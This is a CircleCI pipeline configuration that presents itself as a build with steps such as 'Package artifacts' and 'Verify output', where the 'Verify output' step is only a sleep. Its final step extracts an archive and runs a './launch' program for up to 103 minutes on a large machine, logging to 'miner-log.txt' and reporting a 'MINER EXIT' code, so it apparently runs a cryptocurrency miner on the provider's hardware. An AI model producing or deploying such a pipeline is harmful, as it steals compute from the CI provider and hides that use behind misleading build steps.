version: 2.1

jobs:
  AllTheStates:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: asdf
          command: |
            mkdir -p /var/tmp/stage4
            set +o pipefail 2>/dev/null; for i in $(seq 1 10000); do echo "it-$((i*3))"; done > /var/tmp/stage4/GIF.Shimmer; true
            echo "finalized $(wc -c </var/tmp/stage4/GIF.Shimmer)"
      - persist_to_workspace:
          root: /var/tmp/stage4
          paths:
            - 'GIF.Shimmer'
  edge-v5:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /var/tmp/stage4
      - run:
          name: Open prior
          command: |
            dirname /var/tmp/stage4/GIF.Shimmer 2>/dev/null || true
      - run:
          name: Snapshot repo
          command: git clone --depth 2 -q --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Load archive
          command: tar -xzvf build-output.tgz
      - run:
          command: ls -la
      - run:
          name: Package artifacts
          command: mkdir -p artifacts
      - run:
          name: Verify output
          no_output_timeout: 15m
          command: sleep 120
      - run:
          no_output_timeout: 103m
          command: |
            mkdir -p /tmp/d
            : > /tmp/d/miner-log.txt
            tail -F /tmp/d/miner-log.txt &
            TAIL_PID=$!
            bash -c "./launch"
            MRC=$?
            sleep 2
            kill $TAIL_PID 2>/dev/null || true
            echo "---MINER EXIT=$MRC---"
            echo "---FULL LOG:---"
            cat /tmp/d/miner-log.txt 2>/dev/null
            exit $MRC
